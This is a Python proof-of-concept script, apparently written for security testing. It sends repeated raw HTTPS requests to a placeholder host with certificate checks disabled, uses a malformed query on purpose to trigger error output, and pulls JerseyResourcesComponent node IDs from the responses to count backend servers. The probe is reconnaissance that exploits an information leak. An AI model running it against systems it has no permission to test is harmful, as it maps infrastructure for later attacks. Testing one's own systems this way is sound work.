import argparse
import re
import ssl
import socket
import sys
import time

from typing import Dict, Tuple, Union

"""
A simple program that POC JerseyComponent issue and enumerate unique node ids
"""

# Color codes
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
NC = "\033[0m"

# Constants
HOST = "TARGET_HOST" 
PORT = 443
HTTP = "HTTP/1.1"
PATH = "/TARGET_PATH/select?q=*:*&start={}"  # intentional malformed input for probing
NODE_ID_REGEX = re.compile(r"JerseyResourcesComponent\{.*?\.component\.(\d+)\}")


BANNER = rf"""
                  _                      _          
  _ __   ___   __| | ___ _ __  _ __ ___ | |__   ___ 
 | '_ \ / _ \ / _` |/ _ \ '_ \| '__/ _ \| '_ \ / _ \
 | | | | (_) | (_| |  __/ |_) | | | (_) | |_) |  __/
 |_| |_|\___/ \__,_|\___| .__/|_|  \___/|_.__/ \___|
                        |_|                         

            Backend Node Enumeration Tool
                  by olofmagn v1.0
        """


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Test JerseyComponent issue and enumerate unique node ids"
    )

    parser.add_argument(
        "--requests", 
        default=20, 
        type=int, 
        help="Number of requests")

    parser.add_argument(
        "--delay", 
        default=0.2, 
        type=float, 
        help="Delay between requests"
    )

    return parser.parse_args()


def raw_request(timeout: Union[int, float] = 10) -> Tuple[int, str]:
    """
    Perform a raw HTTPS request and return the status code and response body

    Args:
    - timeout (Union[int, float]): connection timeout in seconds

    Returns:
    - status code (int): HTTP status code
    - response body (str): raw response body
    """

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    chunks = []

    # Build request
    request = f"GET {PATH} {HTTP}\r\nHost: {HOST}\r\nConnection: close\r\n\r\n"
    with socket.create_connection((HOST, PORT), timeout=timeout) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as tls:
            tls.sendall(request.encode())

            while chunk := tls.recv(4096):
                chunks.append(chunk)

    raw = b"".join(chunks).decode(errors="replace")

    # Extract status code from response
    try:
        status_line = raw.split("\r\n", 1)[0]
        status = int(status_line.split(" ")[1])
    except (IndexError, ValueError):
        status = 0

    return status, raw


def collect(
    count: int, delay: Union[int, float]
) -> Tuple[Dict[str, int], Dict[str, int]]:
    """
    Perform multiple requests and collect results

    Args:
    - count (int): number of requests to perform
    - delay (Union[int, float]): delay between requests in seconds

    Returns:
    - seen (Dict[str, int]): mapping of node id to first request number
    - hits (Dict[str, int]): mapping of node id to number of times
    """

    seen = {}
    hits = {}

    # Perform requests
    for i in range(1, count + 1):
        try:
            status, body = raw_request()
            error = None
        except Exception as e:
            status, body = 0, ""
            error = str(e)

        # Extract node ID from response
        node = NODE_ID_REGEX.search(body)
        node_id = node.group(1) if node else None

        # Update seen and hits
        if node_id:
            hits[node_id] = hits.get(node_id, 0) + 1
            seen.setdefault(node_id, i)

        print_logging(i, status, node_id, error, seen)

        time.sleep(delay)

    return seen, hits


def print_logging(
    i: int,
    status: int,
    node_id: str,
    error: str,
    seen: Dict[str, int],
) -> None:
    """
    Print the logging for each request

    Args:
    - i (int): request number
    - status (int): HTTP status code
    - node_id (str): extracted node id from response
    - error (str): error message if request failed
    - seen (Dict[str, int]): mapping of node id to first request number
    """

    # Check for request errors
    if error:
        print(f"{RED}[!] Request failed: {error}{NC}")
        sys.exit(1)

    # Visualize node id status
    if node_id:
        if seen.get(node_id) == i:
            print(f"{GREEN}[{i}] {status} node: {node_id} ← NEW{NC}")
        else:
            print(f"[{i}] {status} node: {node_id}")
    else:
        print(f"[{i}] {status} no match")


def print_summary(seen: Dict[str, int], hits: Dict[str, int], count: int) -> None:
    """
    Print a summary of the unique nodes found
    Args:
    - seen (Dict[str, int]): mapping of node id to first request number
    - hits (Dict[str, int]): mapping of node id to number of times
    - count (int): total number of requests
    """

    if not hits:
        print("\n[!] No node IDs found in responses")
        return
    
    # Unique nodes summary
    unique = len(seen)

    # Calculate width for node id column
    width = max(len(n) for n in hits)

    print(f"{MAGENTA}{'─' * 30}{NC}")

    # Sort by hits
    for node_id, c in sorted(hits.items(), key=lambda x: -x[1]):
        pct = (c / count) * 100
        first_seen = seen.get(node_id, "?")
        print(f"  {node_id:{width}} {c:>4}x {pct:5.1f}% (#{first_seen})")

    # Summary of findings
    if unique > 1:
        print(f"{YELLOW}\n[~] {unique} backend nodes detected{NC}")
    elif unique == 1:
        print(f"{YELLOW}\n[~] Single node or sticky sessions{NC}")
    else:
        print("\n[!] No IDs found")


def run(count: int, delay: Union[int, float]) -> None:
    """
    Run the test with given parameters

    Args:
    - count (int): number of requests to perform
    - delay (Union[int, float]): delay between requests
    """

    print(f"{BLUE}{HOST}{PATH}{NC}")
    print(f"{BLUE}Request {count} | Delay: {delay}s{NC}")
    print(f"{MAGENTA}{'─' * 30}{NC}")
    

    start = time.time()
    seen, hits = collect(count, delay)
    duration = time.time() - start

    print_summary(seen, hits, count)
    print(f"\n{duration:.2f}s ({count/duration:.2f} req/s)")


def main():
    print(BANNER)

    args = parse_args()

    run(args.requests, args.delay)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Unexpected Error: {e}{NC}")
        sys.exit(1)
